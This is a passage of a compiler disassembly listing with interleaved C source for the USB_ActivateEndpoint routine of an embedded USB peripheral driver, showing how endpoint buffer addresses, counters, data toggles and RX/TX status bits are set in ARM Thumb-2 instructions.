 80060f0:	683b      	ldr	r3, [r7, #0]
 80060f2:	781b      	ldrb	r3, [r3, #0]
 80060f4:	009b      	lsls	r3, r3, #2
 80060f6:	4413      	add	r3, r2
 80060f8:	881b      	ldrh	r3, [r3, #0]
 80060fa:	b29b      	uxth	r3, r3
 80060fc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006100:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006104:	81fb      	strh	r3, [r7, #14]
 8006106:	687a      	ldr	r2, [r7, #4]
 8006108:	683b      	ldr	r3, [r7, #0]
 800610a:	781b      	ldrb	r3, [r3, #0]
 800610c:	009b      	lsls	r3, r3, #2
 800610e:	441a      	add	r2, r3
 8006110:	89fb      	ldrh	r3, [r7, #14]
 8006112:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006116:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800611a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800611e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006122:	b29b      	uxth	r3, r3
 8006124:	8013      	strh	r3, [r2, #0]
 8006126:	e2b8      	b.n	800669a <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006128:	687b      	ldr	r3, [r7, #4]
 800612a:	633b      	str	r3, [r7, #48]	; 0x30
 800612c:	687b      	ldr	r3, [r7, #4]
 800612e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006132:	b29b      	uxth	r3, r3
 8006134:	461a      	mov	r2, r3
 8006136:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006138:	4413      	add	r3, r2
 800613a:	633b      	str	r3, [r7, #48]	; 0x30
 800613c:	683b      	ldr	r3, [r7, #0]
 800613e:	781b      	ldrb	r3, [r3, #0]
 8006140:	00da      	lsls	r2, r3, #3
 8006142:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006144:	4413      	add	r3, r2
 8006146:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800614a:	62fb      	str	r3, [r7, #44]	; 0x2c
 800614c:	683b      	ldr	r3, [r7, #0]
 800614e:	88db      	ldrh	r3, [r3, #6]
 8006150:	085b      	lsrs	r3, r3, #1
 8006152:	b29b      	uxth	r3, r3
 8006154:	005b      	lsls	r3, r3, #1
 8006156:	b29a      	uxth	r2, r3
 8006158:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 800615a:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 800615c:	687b      	ldr	r3, [r7, #4]
 800615e:	62bb      	str	r3, [r7, #40]	; 0x28
 8006160:	687b      	ldr	r3, [r7, #4]
 8006162:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006166:	b29b      	uxth	r3, r3
 8006168:	461a      	mov	r2, r3
 800616a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800616c:	4413      	add	r3, r2
 800616e:	62bb      	str	r3, [r7, #40]	; 0x28
 8006170:	683b      	ldr	r3, [r7, #0]
 8006172:	781b      	ldrb	r3, [r3, #0]
 8006174:	00da      	lsls	r2, r3, #3
 8006176:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006178:	4413      	add	r3, r2
 800617a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800617e:	627b      	str	r3, [r7, #36]	; 0x24
 8006180:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006182:	881b      	ldrh	r3, [r3, #0]
 8006184:	b29b      	uxth	r3, r3
 8006186:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800618a:	b29a      	uxth	r2, r3
 800618c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800618e:	801a      	strh	r2, [r3, #0]
 8006190:	683b      	ldr	r3, [r7, #0]
 8006192:	691b      	ldr	r3, [r3, #16]
 8006194:	2b3e      	cmp	r3, #62	; 0x3e
 8006196:	d91d      	bls.n	80061d4 <USB_ActivateEndpoint+0x2b0>
 8006198:	683b      	ldr	r3, [r7, #0]
 800619a:	691b      	ldr	r3, [r3, #16]
 800619c:	095b      	lsrs	r3, r3, #5
 800619e:	66bb      	str	r3, [r7, #104]	; 0x68
 80061a0:	683b      	ldr	r3, [r7, #0]
 80061a2:	691b      	ldr	r3, [r3, #16]
 80061a4:	f003 031f 	and.w	r3, r3, #31
 80061a8:	2b00      	cmp	r3, #0
 80061aa:	d102      	bne.n	80061b2 <USB_ActivateEndpoint+0x28e>
 80061ac:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061ae:	3b01      	subs	r3, #1
 80061b0:	66bb      	str	r3, [r7, #104]	; 0x68
 80061b2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061b4:	881b      	ldrh	r3, [r3, #0]
 80061b6:	b29a      	uxth	r2, r3
 80061b8:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061ba:	b29b      	uxth	r3, r3
 80061bc:	029b      	lsls	r3, r3, #10
 80061be:	b29b      	uxth	r3, r3
 80061c0:	4313      	orrs	r3, r2
 80061c2:	b29b      	uxth	r3, r3
 80061c4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80061c8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80061cc:	b29a      	uxth	r2, r3
 80061ce:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061d0:	801a      	strh	r2, [r3, #0]
 80061d2:	e026      	b.n	8006222 <USB_ActivateEndpoint+0x2fe>
 80061d4:	683b      	ldr	r3, [r7, #0]
 80061d6:	691b      	ldr	r3, [r3, #16]
 80061d8:	2b00      	cmp	r3, #0
 80061da:	d10a      	bne.n	80061f2 <USB_ActivateEndpoint+0x2ce>
 80061dc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061de:	881b      	ldrh	r3, [r3, #0]
 80061e0:	b29b      	uxth	r3, r3
 80061e2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80061e6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80061ea:	b29a      	uxth	r2, r3
 80061ec:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061ee:	801a      	strh	r2, [r3, #0]
 80061f0:	e017      	b.n	8006222 <USB_ActivateEndpoint+0x2fe>
 80061f2:	683b      	ldr	r3, [r7, #0]
 80061f4:	691b      	ldr	r3, [r3, #16]
 80061f6:	085b      	lsrs	r3, r3, #1
 80061f8:	66bb      	str	r3, [r7, #104]	; 0x68
 80061fa:	683b      	ldr	r3, [r7, #0]
 80061fc:	691b      	ldr	r3, [r3, #16]
 80061fe:	f003 0301 	and.w	r3, r3, #1
 8006202:	2b00      	cmp	r3, #0
 8006204:	d002      	beq.n	800620c <USB_ActivateEndpoint+0x2e8>
 8006206:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006208:	3301      	adds	r3, #1
 800620a:	66bb      	str	r3, [r7, #104]	; 0x68
 800620c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800620e:	881b      	ldrh	r3, [r3, #0]
 8006210:	b29a      	uxth	r2, r3
 8006212:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006214:	b29b      	uxth	r3, r3
 8006216:	029b      	lsls	r3, r3, #10
 8006218:	b29b      	uxth	r3, r3
 800621a:	4313      	orrs	r3, r2
 800621c:	b29a      	uxth	r2, r3
 800621e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006220:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006222:	687a      	ldr	r2, [r7, #4]
 8006224:	683b      	ldr	r3, [r7, #0]
 8006226:	781b      	ldrb	r3, [r3, #0]
 8006228:	009b      	lsls	r3, r3, #2
 800622a:	4413      	add	r3, r2
 800622c:	881b      	ldrh	r3, [r3, #0]
 800622e:	847b      	strh	r3, [r7, #34]	; 0x22
 8006230:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006232:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006236:	2b00      	cmp	r3, #0
 8006238:	d01b      	beq.n	8006272 <USB_ActivateEndpoint+0x34e>
 800623a:	687a      	ldr	r2, [r7, #4]
 800623c:	683b      	ldr	r3, [r7, #0]
 800623e:	781b      	ldrb	r3, [r3, #0]
 8006240:	009b      	lsls	r3, r3, #2
 8006242:	4413      	add	r3, r2
 8006244:	881b      	ldrh	r3, [r3, #0]
 8006246:	b29b      	uxth	r3, r3
 8006248:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800624c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006250:	843b      	strh	r3, [r7, #32]
 8006252:	687a      	ldr	r2, [r7, #4]
 8006254:	683b      	ldr	r3, [r7, #0]
 8006256:	781b      	ldrb	r3, [r3, #0]
 8006258:	009b      	lsls	r3, r3, #2
 800625a:	441a      	add	r2, r3
 800625c:	8c3b      	ldrh	r3, [r7, #32]
 800625e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006262:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006266:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800626a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800626e:	b29b      	uxth	r3, r3
 8006270:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 8006272:	683b      	ldr	r3, [r7, #0]
 8006274:	781b      	ldrb	r3, [r3, #0]
 8006276:	2b00      	cmp	r3, #0
 8006278:	d124      	bne.n	80062c4 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800627a:	687a      	ldr	r2, [r7, #4]
 800627c:	683b      	ldr	r3, [r7, #0]
 800627e:	781b      	ldrb	r3, [r3, #0]
 8006280:	009b      	lsls	r3, r3, #2
 8006282:	4413      	add	r3, r2
 8006284:	881b      	ldrh	r3, [r3, #0]
 8006286:	b29b      	uxth	r3, r3
 8006288:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800628c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006290:	83bb      	strh	r3, [r7, #28]
 8006292:	8bbb      	ldrh	r3, [r7, #28]
 8006294:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006298:	83bb      	strh	r3, [r7, #28]
 800629a:	8bbb      	ldrh	r3, [r7, #28]
 800629c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80062a0:	83bb      	strh	r3, [r7, #28]
 80062a2:	687a      	ldr	r2, [r7, #4]
 80062a4:	683b      	ldr	r3, [r7, #0]
 80062a6:	781b      	ldrb	r3, [r3, #0]
 80062a8:	009b      	lsls	r3, r3, #2
 80062aa:	441a      	add	r2, r3
 80062ac:	8bbb      	ldrh	r3, [r7, #28]
 80062ae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062b2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062b6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062ba:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062be:	b29b      	uxth	r3, r3
 80062c0:	8013      	strh	r3, [r2, #0]
 80062c2:	e1ea      	b.n	800669a <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 80062c4:	687a      	ldr	r2, [r7, #4]
 80062c6:	683b      	ldr	r3, [r7, #0]
 80062c8:	781b      	ldrb	r3, [r3, #0]
 80062ca:	009b      	lsls	r3, r3, #2
 80062cc:	4413      	add	r3, r2
 80062ce:	881b      	ldrh	r3, [r3, #0]
 80062d0:	b29b      	uxth	r3, r3
 80062d2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80062d6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062da:	83fb      	strh	r3, [r7, #30]
 80062dc:	8bfb      	ldrh	r3, [r7, #30]
 80062de:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80062e2:	83fb      	strh	r3, [r7, #30]
 80062e4:	687a      	ldr	r2, [r7, #4]
 80062e6:	683b      	ldr	r3, [r7, #0]
 80062e8:	781b      	ldrb	r3, [r3, #0]
 80062ea:	009b      	lsls	r3, r3, #2
 80062ec:	441a      	add	r2, r3
 80062ee:	8bfb      	ldrh	r3, [r7, #30]
 80062f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062f8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062fc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006300:	b29b      	uxth	r3, r3
 8006302:	8013      	strh	r3, [r2, #0]
 8006304:	e1c9      	b.n	800669a <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 8006306:	683b      	ldr	r3, [r7, #0]
 8006308:	78db      	ldrb	r3, [r3, #3]
 800630a:	2b02      	cmp	r3, #2
 800630c:	d11e      	bne.n	800634c <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 800630e:	687a      	ldr	r2, [r7, #4]
 8006310:	683b      	ldr	r3, [r7, #0]
 8006312:	781b      	ldrb	r3, [r3, #0]
 8006314:	009b      	lsls	r3, r3, #2
 8006316:	4413      	add	r3, r2
 8006318:	881b      	ldrh	r3, [r3, #0]
 800631a:	b29b      	uxth	r3, r3
 800631c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006320:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006324:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8006328:	687a      	ldr	r2, [r7, #4]
 800632a:	683b      	ldr	r3, [r7, #0]
 800632c:	781b      	ldrb	r3, [r3, #0]
 800632e:	009b      	lsls	r3, r3, #2
 8006330:	441a      	add	r2, r3
 8006332:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8006336:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800633a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800633e:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006342:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006346:	b29b      	uxth	r3, r3
 8006348:	8013      	strh	r3, [r2, #0]
 800634a:	e01d      	b.n	8006388 <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 800634c:	687a      	ldr	r2, [r7, #4]
 800634e:	683b      	ldr	r3, [r7, #0]
 8006350:	781b      	ldrb	r3, [r3, #0]
 8006352:	009b      	lsls	r3, r3, #2
 8006354:	4413      	add	r3, r2
 8006356:	881b      	ldrh	r3, [r3, #0]
 8006358:	b29b      	uxth	r3, r3
 800635a:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800635e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006362:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 8006366:	687a      	ldr	r2, [r7, #4]
 8006368:	683b      	ldr	r3, [r7, #0]
 800636a:	781b      	ldrb	r3, [r3, #0]
 800636c:	009b      	lsls	r3, r3, #2
 800636e:	441a      	add	r2, r3
 8006370:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006374:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006378:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800637c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006380:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006384:	b29b      	uxth	r3, r3
 8006386:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 8006388:	687b      	ldr	r3, [r7, #4]
 800638a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800638c:	687b      	ldr	r3, [r7, #4]
 800638e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006392:	b29b      	uxth	r3, r3
 8006394:	461a      	mov	r2, r3
 8006396:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006398:	4413      	add	r3, r2
 800639a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800639c:	683b      	ldr	r3, [r7, #0]
 800639e:	781b      	ldrb	r3, [r3, #0]
 80063a0:	00da      	lsls	r2, r3, #3
 80063a2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80063a4:	4413      	add	r3, r2
 80063a6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80063aa:	65bb      	str	r3, [r7, #88]	; 0x58
 80063ac:	683b      	ldr	r3, [r7, #0]
 80063ae:	891b      	ldrh	r3, [r3, #8]
 80063b0:	085b      	lsrs	r3, r3, #1
 80063b2:	b29b      	uxth	r3, r3
 80063b4:	005b      	lsls	r3, r3, #1
 80063b6:	b29a      	uxth	r2, r3
 80063b8:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80063ba:	801a      	strh	r2, [r3, #0]
 80063bc:	687b      	ldr	r3, [r7, #4]
 80063be:	657b      	str	r3, [r7, #84]	; 0x54
 80063c0:	687b      	ldr	r3, [r7, #4]
 80063c2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80063c6:	b29b      	uxth	r3, r3
 80063c8:	461a      	mov	r2, r3
 80063ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80063cc:	4413      	add	r3, r2
 80063ce:	657b      	str	r3, [r7, #84]	; 0x54
 80063d0:	683b      	ldr	r3, [r7, #0]
 80063d2:	781b      	ldrb	r3, [r3, #0]
 80063d4:	00da      	lsls	r2, r3, #3
 80063d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80063d8:	4413      	add	r3, r2
 80063da:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80063de:	653b      	str	r3, [r7, #80]	; 0x50
 80063e0:	683b      	ldr	r3, [r7, #0]
 80063e2:	895b      	ldrh	r3, [r3, #10]
 80063e4:	085b      	lsrs	r3, r3, #1
 80063e6:	b29b      	uxth	r3, r3
 80063e8:	005b      	lsls	r3, r3, #1
 80063ea:	b29a      	uxth	r2, r3
 80063ec:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80063ee:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 80063f0:	683b      	ldr	r3, [r7, #0]
 80063f2:	785b      	ldrb	r3, [r3, #1]
 80063f4:	2b00      	cmp	r3, #0
 80063f6:	f040 8093 	bne.w	8006520 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80063fa:	687a      	ldr	r2, [r7, #4]
 80063fc:	683b      	ldr	r3, [r7, #0]
 80063fe:	781b      	ldrb	r3, [r3, #0]
 8006400:	009b      	lsls	r3, r3, #2
 8006402:	4413      	add	r3, r2
 8006404:	881b      	ldrh	r3, [r3, #0]
 8006406:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 800640a:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 800640e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006412:	2b00      	cmp	r3, #0
 8006414:	d01b      	beq.n	800644e <USB_ActivateEndpoint+0x52a>
 8006416:	687a      	ldr	r2, [r7, #4]
 8006418:	683b      	ldr	r3, [r7, #0]
 800641a:	781b      	ldrb	r3, [r3, #0]
 800641c:	009b      	lsls	r3, r3, #2
 800641e:	4413      	add	r3, r2
 8006420:	881b      	ldrh	r3, [r3, #0]
 8006422:	b29b      	uxth	r3, r3
 8006424:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006428:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800642c:	87fb      	strh	r3, [r7, #62]	; 0x3e
 800642e:	687a      	ldr	r2, [r7, #4]
 8006430:	683b      	ldr	r3, [r7, #0]
 8006432:	781b      	ldrb	r3, [r3, #0]
 8006434:	009b      	lsls	r3, r3, #2
 8006436:	441a      	add	r2, r3
 8006438:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 800643a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800643e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006442:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006446:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800644a:	b29b      	uxth	r3, r3
 800644c:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800644e:	687a      	ldr	r2, [r7, #4]
 8006450:	683b      	ldr	r3, [r7, #0]
 8006452:	781b      	ldrb	r3, [r3, #0]
 8006454:	009b      	lsls	r3, r3, #2
 8006456:	4413      	add	r3, r2
 8006458:	881b      	ldrh	r3, [r3, #0]
 800645a:	87bb      	strh	r3, [r7, #60]	; 0x3c
 800645c:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 800645e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006462:	2b00      	cmp	r3, #0
 8006464:	d01b      	beq.n	800649e <USB_ActivateEndpoint+0x57a>
 8006466:	687a      	ldr	r2, [r7, #4]
 8006468:	683b      	ldr	r3, [r7, #0]
 800646a:	781b      	ldrb	r3, [r3, #0]
 800646c:	009b      	lsls	r3, r3, #2
 800646e:	4413      	add	r3, r2
 8006470:	881b      	ldrh	r3, [r3, #0]
 8006472:	b29b      	uxth	r3, r3
 8006474:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006478:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800647c:	877b      	strh	r3, [r7, #58]	; 0x3a
 800647e:	687a      	ldr	r2, [r7, #4]
 8006480:	683b      	ldr	r3, [r7, #0]
 8006482:	781b      	ldrb	r3, [r3, #0]
 8006484:	009b      	lsls	r3, r3, #2
 8006486:	441a      	add	r2, r3
 8006488:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800648a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800648e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006492:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006496:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800649a:	b29b      	uxth	r3, r3
 800649c:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800649e:	687a      	ldr	r2, [r7, #4]
 80064a0:	683b      	ldr	r3, [r7, #0]
 80064a2:	781b      	ldrb	r3, [r3, #0]
 80064a4:	009b      	lsls	r3, r3, #2
 80064a6:	4413      	add	r3, r2
 80064a8:	881b      	ldrh	r3, [r3, #0]
 80064aa:	b29b      	uxth	r3, r3
 80064ac:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80064b0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064b4:	873b      	strh	r3, [r7, #56]	; 0x38
 80064b6:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064b8:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80064bc:	873b      	strh	r3, [r7, #56]	; 0x38
 80064be:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064c0:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80064c4:	873b      	strh	r3, [r7, #56]	; 0x38
 80064c6:	687a      	ldr	r2, [r7, #4]
 80064c8:	683b      	ldr	r3, [r7, #0]
 80064ca:	781b      	ldrb	r3, [r3, #0]
 80064cc:	009b      	lsls	r3, r3, #2
 80064ce:	441a      	add	r2, r3
 80064d0:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064d2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064d6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064da:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064de:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064e2:	b29b      	uxth	r3, r3
 80064e4:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80064e6:	687a      	ldr	r2, [r7, #4]
 80064e8:	683b      	ldr	r3, [r7, #0]
 80064ea:	781b      	ldrb	r3, [r3, #0]
 80064ec:	009b      	lsls	r3, r3, #2
 80064ee:	4413      	add	r3, r2
 80064f0:	881b      	ldrh	r3, [r3, #0]
 80064f2:	b29b      	uxth	r3, r3
 80064f4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064f8:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80064fc:	86fb      	strh	r3, [r7, #54]	; 0x36
 80064fe:	687a      	ldr	r2, [r7, #4]
 8006500:	683b      	ldr	r3, [r7, #0]
 8006502:	781b      	ldrb	r3, [r3, #0]
 8006504:	009b      	lsls	r3, r3, #2
 8006506:	441a      	add	r2, r3
 8006508:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 800650a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800650e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006512:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006516:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800651a:	b29b      	uxth	r3, r3
 800651c:	8013      	strh	r3, [r2, #0]
 800651e:	e0bc      	b.n	800669a <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006520:	687a      	ldr	r2, [r7, #4]
 8006522:	683b      	ldr	r3, [r7, #0]
 8006524:	781b      	ldrb	r3, [r3, #0]
 8006526:	009b      	lsls	r3, r3, #2
 8006528:	4413      	add	r3, r2
 800652a:	881b      	ldrh	r3, [r3, #0]
 800652c:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8006530:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8006534:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006538:	2b00      	cmp	r3, #0
 800653a:	d01d      	beq.n	8006578 <USB_ActivateEndpoint+0x654>
 800653c:	687a      	ldr	r2, [r7, #4]
 800653e:	683b      	ldr	r3, [r7, #0]
 8006540:	781b      	ldrb	r3, [r3, #0]
 8006542:	009b      	lsls	r3, r3, #2
 8006544:	4413      	add	r3, r2
 8006546:	881b      	ldrh	r3, [r3, #0]
 8006548:	b29b      	uxth	r3, r3
 800654a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800654e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006552:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 8006556:	687a      	ldr	r2, [r7, #4]
 8006558:	683b      	ldr	r3, [r7, #0]
 800655a:	781b      	ldrb	r3, [r3, #0]
 800655c:	009b      	lsls	r3, r3, #2
 800655e:	441a      	add	r2, r3
 8006560:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006564:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006568:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800656c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006570:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006574:	b29b      	uxth	r3, r3
 8006576:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006578:	687a      	ldr	r2, [r7, #4]
 800657a:	683b      	ldr	r3, [r7, #0]
 800657c:	781b      	ldrb	r3, [r3, #0]
 800657e:	009b      	lsls	r3, r3, #2
 8006580:	4413      	add	r3, r2
 8006582:	881b      	ldrh	r3, [r3, #0]
 8006584:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 8006588:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800658c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006590:	2b00      	cmp	r3, #0
 8006592:	d01d      	beq.n	80065d0 <USB_ActivateEndpoint+0x6ac>
 8006594:	687a      	ldr	r2, [r7, #4]
 8006596:	683b      	ldr	r3, [r7, #0]
 8006598:	781b      	ldrb	r3, [r3, #0]
 800659a:	009b      	lsls	r3, r3, #2
 800659c:	4413      	add	r3, r2
 800659e:	881b      	ldrh	r3, [r3, #0]
 80065a0:	b29b      	uxth	r3, r3
 80065a2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065a6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065aa:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80065ae:	687a      	ldr	r2, [r7, #4]
 80065b0:	683b      	ldr	r3, [r7, #0]
 80065b2:	781b      	ldrb	r3, [r3, #0]
 80065b4:	009b      	lsls	r3, r3, #2
 80065b6:	441a      	add	r2, r3
 80065b8:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 80065bc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065c0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065c4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
